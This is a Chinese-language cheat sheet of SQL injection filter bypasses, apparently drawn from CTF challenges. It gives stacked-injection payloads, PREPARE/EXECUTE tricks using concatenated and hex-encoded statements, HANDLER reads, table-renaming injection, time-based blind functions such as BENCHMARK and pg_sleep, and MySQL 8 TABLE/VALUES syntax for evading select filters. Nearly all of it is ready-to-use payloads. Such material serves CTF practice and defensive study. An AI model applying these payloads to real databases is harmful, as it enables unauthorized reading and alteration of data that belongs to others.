# SQL注入常用bypass

## 0x00 堆叠注入

可以在过滤了union的情况下使用，加`；`就可以，类似于命令执行中的绕过一样。

```
 0';show columns from `1919810931114514`;#
```

经典堆叠

### 1.预处理语句

```
PREPARE sqla from '[my sql sequece]';   //预定义SQL语句
EXECUTE sqla;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
```

例如

```
SET @tn = 'FlagHere';  //存储表名
SET @sql = concat('select * from ', @tn);  //存储SQL语句
PREPARE sql from @sql;   //预定义SQL语句
EXECUTE sql;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
```

这样我们就可以利用字符串拼接的方法，将select拼接出来，然后利用预执行语句，进行执行，最后完成整个堆叠注入

也可利用`char()`方法将ASCII码转换为SELECT字符串，接着利用concat()方法进行拼接获得查询的SQL语句，最后执行即可。

```
mysql中的prepare：准备一条SQL语句，并分配给这条SQL语句一个名字供之后调用；
EXECUTE ：执行命令
DEALLOCATE PREPARE：释放命令；
 SQL 语句中，我们使用了问号 (?)，在此我们可以将问号替换为整型，字符串，双精度浮点型和布尔值
 set 设置一个预置的sql语句
```

### 2. handler语句代替select

```
handler FlagHere  open as yunensec; #指定数据表进行载入并将返回句柄重命名
handler yunensec read first; #读取指定表/句柄的首行数据
handler yunensec read next; #读取指定表/句柄的下一行数据
handler yunensec read next; #读取指定表/句柄的下一行数据
...
handler yunensec close; #关闭句柄
```

### 3 重命名注入

原理:本身的sql查询时就有一条查询数据库的语句，而我们如果将跨裤查询的别名改成现在的库的名字，然后执行查询语句，就可以直接查询例外一个表的语句了，这里

```
1';
alter table words rename to words1;
alter table `1919810931114514` rename to words;
alter table words change flag id varchar(50);#
```

### 4 预编译注入

原理：mysql中支持执行十六进制的语句

```
1';
SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
prepare execsql from @a;
execute execsql;#
```

## 0x02 时间盲注

 sqlite的时间盲注

```
randomblob(num) 生成num个字符来实现盲注
```

mysql的另类时间盲注

```
BENCHMARK(num) 同理
```

sqlite中

```
union seelct ('num') 这样会直接输出num 而不用关注列数是否一致
```

postsql 的 pg_sleep语法。

## 0x03 mysql8的语法(过select)

```
TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
```

作用是直接列出表的全部内容

```
VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]
row_constructor_list:
ROW(value_list)[, ROW(value_list)][, ...]
value_list:
value[, value][, ...]
column_designator:
column_index
```

![image-20201227195358848](https://i.loli.net/2020/12/27/znQyYg5ZjsodulA.png)

![image-20201227195420459](https://i.loli.net/2020/12/27/nBNeDdm6OjFvItR.png)

两个混合之后，直呼Nice

![image-20201227195447756](https://i.loli.net/2020/12/27/uWZ7sbIDSPcfLqF.png)

**不用select了**

![image-20201227195521175](https://i.loli.net/2020/12/27/n6GtycLuhv8RTjW.png)

然后新的风暴就出现了。